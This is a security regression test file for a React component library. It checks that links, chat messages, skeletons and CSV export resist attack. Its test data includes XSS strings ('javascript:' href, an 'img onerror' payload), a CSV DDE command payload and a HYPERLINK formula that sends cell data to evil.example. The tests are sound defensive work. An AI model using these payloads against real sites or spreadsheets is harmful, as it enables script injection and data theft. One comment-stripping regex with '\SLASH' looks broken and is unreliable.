/**
 * Security regression tests.
 *
 * Two kinds of test live here, and the difference matters when you read a failure:
 *
 * 1. **Locks.** Assertions on behaviour that is already correct (`escapeCsvValue`'s
 *    formula guard). A failure here is a regression — something got less safe.
 * 2. **Characterisation.** Assertions that pin down a *known defect* so the suite stays
 *    green while the finding is open. Each one names the audit finding and says exactly
 *    which line to invert once the fix lands. A failure here means somebody fixed it and
 *    forgot to update the test — which is the good kind of failure.
 */

import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { ChatThread } from './components/chat-thread'
import { Drawer } from './components/drawer'
import { Footer } from './components/footer'
import { Modal } from './components/modal'
import { Skeleton } from './components/skeleton'
import { escapeCsvValue, toCsv } from './utils/export'

/* ------------------------------------------------------------------ *
 * FINDING 1 (high) — FIXED. Overlapping dialogs must not leak `inert` / `aria-hidden`.
 *
 * `hideOutside` used to record each hidden sibling's previous state per dialog instance
 * with no reference counting, so two overlapping dialogs both recorded the same elements
 * and the later cleanup won with a stale value. That left the page either un-inerted
 * while a modal was still open, or permanently inert and unrecoverable without a reload.
 *
 * These two tests were written to characterise the defect and are kept, inverted, as the
 * regression guard: hiding is now reference counted per element.
 * ------------------------------------------------------------------ */

/** The element the app actually lives in: RTL's container, a direct child of <body>. */
function appContainer(): HTMLElement {
  return document.body.firstElementChild as HTMLElement
}

describe('overlapping dialogs: inert bookkeeping', () => {
  it('restores the page when the outer of two nested dialogs closes first', () => {
    function App({ outer, inner }: { outer: boolean; inner: boolean }) {
      return (
        <div>
          <button type="button">page content</button>
          {outer ? (
            <Modal open title="Outer">
              <Modal.Body>outer</Modal.Body>
              {inner ? (
                <Modal open title="Inner">
                  <Modal.Body>inner</Modal.Body>
                </Modal>
              ) : null}
            </Modal>
          ) : null}
        </div>
      )
    }

    const { rerender } = render(<App outer inner />)
    expect(appContainer()).toHaveAttribute('inert')

    // The outer dialog closes, which unmounts the inner one with it. React destroys
    // effects parent-first, so the outer's cleanup runs before the inner's. Reference
    // counting is what makes that order irrelevant.
    rerender(<App outer={false} inner />)

    expect(appContainer()).not.toHaveAttribute('inert')
    expect(appContainer()).not.toHaveAttribute('aria-hidden')
  })

  it('keeps the page inert while a second sibling overlay is still open', () => {
    function App({ modal, drawer }: { modal: boolean; drawer: boolean }) {
      return (
        <div>
          <button type="button">page content</button>
          {modal ? (
            <Modal open title="Modal">
              <Modal.Body>m</Modal.Body>
            </Modal>
          ) : null}
          {drawer ? (
            <Drawer open title="Drawer">
              <Drawer.Body>d</Drawer.Body>
            </Drawer>
          ) : null}
        </div>
      )
    }

    const { rerender } = render(<App modal drawer={false} />)
    rerender(<App modal drawer />)
    expect(appContainer()).toHaveAttribute('inert')

    // The drawer is still open and modal, so the page behind it must stay inert.
    rerender(<App modal={false} drawer />)
    expect(appContainer()).toHaveAttribute('inert')

    // Last one out restores the original state exactly.
    rerender(<App modal={false} drawer={false} />)
    expect(appContainer()).not.toHaveAttribute('inert')
    expect(appContainer()).not.toHaveAttribute('aria-hidden')
  })
})

/* ------------------------------------------------------------------ *
 * FINDING 2 (high on React 18) — link `href` props get no scheme check
 *
 * React 19 replaces a `javascript:` href with a throwing stub. React 18 — the whole
 * 18.x line, including 18.3.1, and inside the declared peer range — only warns and
 * emits the attribute verbatim. So on React 18 these two components are stored-XSS
 * sinks for any consumer that feeds them CMS or API data.
 * ------------------------------------------------------------------ */

describe('link components: href scheme validation', () => {
  const HOSTILE = 'javascript:alert(document.domain)'

  it('Footer drops a javascript: href instead of rendering it', () => {
    render(<Footer columns={[{ title: 'Legal', links: [{ label: 'Terms', href: HOSTILE }] }]} />)
    // No href at all: the anchor is inert and unfocusable, which is the right failure
    // mode for one bad CMS row. Asserted on the element rather than the role, because a
    // link with no href is no longer exposed as a link.
    const anchor = screen.getByText('Terms').closest('a')
    expect(anchor).not.toBeNull()
    expect(anchor).not.toHaveAttribute('href')
  })

  it('Footer keeps safe hrefs, including mailto and tel', () => {
    render(
      <Footer
        columns={[
          {
            title: 'Contact',
            links: [
              { label: 'Docs', href: '/docs' },
              { label: 'Email', href: 'mailto:hi@example.com' },
              { label: 'Phone', href: 'tel:+441234567890' },
            ],
          },
        ]}
      />,
    )
    expect(screen.getByRole('link', { name: 'Docs' })).toHaveAttribute('href', '/docs')
    expect(screen.getByRole('link', { name: 'Email' })).toHaveAttribute(
      'href',
      'mailto:hi@example.com',
    )
    expect(screen.getByRole('link', { name: 'Phone' })).toHaveAttribute('href', 'tel:+441234567890')
  })

  it('Footer adds noopener noreferrer to a new-tab link', () => {
    render(
      <Footer
        columns={[
          {
            title: 'Legal',
            links: [{ label: 'Terms', href: 'https://example.com', target: '_blank' }],
          },
        ]}
      />,
    )
    const rel = screen.getByRole('link', { name: 'Terms' }).getAttribute('rel')?.split(' ').sort()
    expect(rel).toEqual(['noopener', 'noreferrer'])
  })

  // Breadcrumb, Navbar.Brand, Navbar.Link and Sidebar.Item are covered in
  // navigation.test.tsx, alongside the components themselves.
})

/* ------------------------------------------------------------------ *
 * FINDING 3 (medium) — ChatThread spreads the whole message record
 *
 * `messages.map(({ id, ...message }) => <ChatMessage {...message} />)` forwards every
 * other key, and `ChatMessageProps` extends `HTMLAttributes`, so a transcript record is
 * allowed to carry `dangerouslySetInnerHTML`. It cannot become XSS — ChatMessage's
 * <article> always has children, so React throws instead — but the throw takes the
 * whole tree down.
 * ------------------------------------------------------------------ */

describe('ChatThread: message records are projected, not spread', () => {
  it('ignores a smuggled dangerouslySetInnerHTML instead of crashing or injecting', () => {
    const hostile = [
      {
        id: 'm1',
        role: 'assistant' as const,
        content: 'hello',
        // A hostile backend, or a model whose tool output is echoed into the transcript
        // JSON, adds one key. Before the fix this threw out of render and blanked the
        // page; it was never an injection, because React refuses to combine children
        // with dangerouslySetInnerHTML.
        dangerouslySetInnerHTML: { __html: '<img src=x onerror="globalThis.__pwned = 1">' },
      } as never,
    ]

    expect(() => render(<ChatThread messages={hostile} />)).not.toThrow()
    expect(screen.getByText('hello')).toBeInTheDocument()
    expect((globalThis as { __pwned?: number }).__pwned).toBeUndefined()
    expect(document.querySelector('img')).toBeNull()
  })
})

/* ------------------------------------------------------------------ *
 * FINDING 4 (low) — `Skeleton lines` is an unbounded loop
 * ------------------------------------------------------------------ */

describe('Skeleton: lines is clamped', () => {
  it('survives a non-finite lines count', () => {
    // `lines={Infinity}` used to throw RangeError: Invalid array length straight out of
    // render, and a large finite value hung the main thread. A count arriving from an
    // API is enough to hit it.
    expect(() => render(<Skeleton lines={Number.POSITIVE_INFINITY} />)).not.toThrow()
    expect(() => render(<Skeleton lines={Number.NaN} />)).not.toThrow()
  })

  it('caps an absurd lines count instead of rendering it', () => {
    const { container } = render(<Skeleton lines={100000} />)
    expect(container.querySelectorAll('.vk-skeleton').length).toBeLessThanOrEqual(100)
  })

  it('still renders the requested count for sane values', () => {
    const { container } = render(<Skeleton lines={4} />)
    expect(container.querySelectorAll('.vk-skeleton')).toHaveLength(4)
  })
})

/* ------------------------------------------------------------------ *
 * LOCK — CSV formula injection is neutralised. utils/export.ts is correct
 * today; these assertions exist so it stays that way.
 * ------------------------------------------------------------------ */

describe('CSV export: formula injection', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])('prefixes a leading %j', (trigger) => {
    const payload = `${trigger}cmd|'/c calc'!A1`
    // The guard runs before RFC 4180 quoting, so for a value that also has to be
    // quoted (the CR case) the apostrophe sits just inside the opening quote. What
    // matters is the *cell content* a spreadsheet ends up with, so strip the wrapper.
    const field = escapeCsvValue(payload)
    const cell = field.startsWith('"') ? field.slice(1) : field
    expect(cell.startsWith("'")).toBe(true)
  })

  it('neutralises the classic HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("https://evil.example/?d="&A1,"Click me")'
    const field = escapeCsvValue(payload)
    // Guarded first, then RFC 4180 quoted because it contains `,` and `"`.
    expect(field).toBe('"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Click me"")"')
    expect(field.includes('"=HYPERLINK')).toBe(false)
  })

  it('exempts real numbers so a negative value is not turned into text', () => {
    expect(escapeCsvValue(-5)).toBe('-5')
    // ...but the *string* "-5" came from data we do not control, so it is guarded.
    expect(escapeCsvValue('-5')).toBe("'-5")
  })

  it('quotes and doubles embedded quotes, and never lets a field split a row', () => {
    expect(escapeCsvValue('a,b')).toBe('"a,b"')
    expect(escapeCsvValue('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvValue('line1\nline2')).toBe('"line1\nline2"')
  })

  it('guards header cells too, not just body cells', () => {
    const csv = toCsv([{ x: 1 }], [{ key: 'x', header: '=1+1' }])
    expect(csv.split('\r\n')[0]).toBe("'=1+1")
  })

  it('a prototype key in a column reads nothing exploitable and pollutes nothing', () => {
    const csv = toCsv([{ a: 1 }], [{ key: '__proto__' }, { key: 'constructor' }])
    expect(csv).toBe('__proto__,constructor\r\n{},')
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  it('formulaGuard: false is opt-in only', () => {
    expect(escapeCsvValue('=1+1', { formulaGuard: false })).toBe('=1+1')
  })
})

/* ------------------------------------------------------------------ *
 * The dangerouslySetInnerHTML budget: exactly one, and it must stay safe.
 *
 * The README states the library never turns data into markup. One API genuinely cannot
 * exist without dangerouslySetInnerHTML - JSON-LD, whose payload must be a raw script
 * body because React escapes text children - so the claim is "exactly one audited use"
 * and this suite is what keeps it true. A second use anywhere in src fails here before
 * any reviewer finds it.
 * ------------------------------------------------------------------ */

describe('the dangerouslySetInnerHTML budget', () => {
  const files: string[] = []
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name)
      if (entry.isDirectory()) walk(path)
      else if (/\.tsx?$/.test(entry.name) && !entry.name.includes('.test.')) files.push(path)
    }
  }
  walk(join(__dirname))

  /*
   * Comments are stripped first: theme-provider's JSDoc shows consumers how to inline the
   * anti-flash script with dangerouslySetInnerHTML in THEIR layout, which is documentation,
   * not a use. Only code that actually passes the prop counts against the budget.
   */
  const uses = files.filter((file) => {
    const code = readFileSync(file, 'utf8')
      .replace(/\/\*[\s \S]*?\*\//g, '')
      .replace(/^\s*\SLASH.*$/gm, '')
    return /dangerouslySetInnerHTML=/.test(code)
  })

  it('is spent on exactly one file: the FAQ JSON-LD block', () => {
    expect(uses.map((file) => file.replace(/\\/g, '/').split('/').slice(-2).join('/'))).toEqual([
      'faq/faq.tsx',
    ])
  })

  it('that file escapes < before anything reaches the script body', () => {
    // Without the escape, item text containing </script> closes the tag early and the
    // rest of the payload parses as markup - the classic JSON-LD injection.
    const source = readFileSync(uses[0] ?? '', 'utf8')
    expect(source).toContain(String.raw`replace(/</g, '\\u003c')`)
  })
})
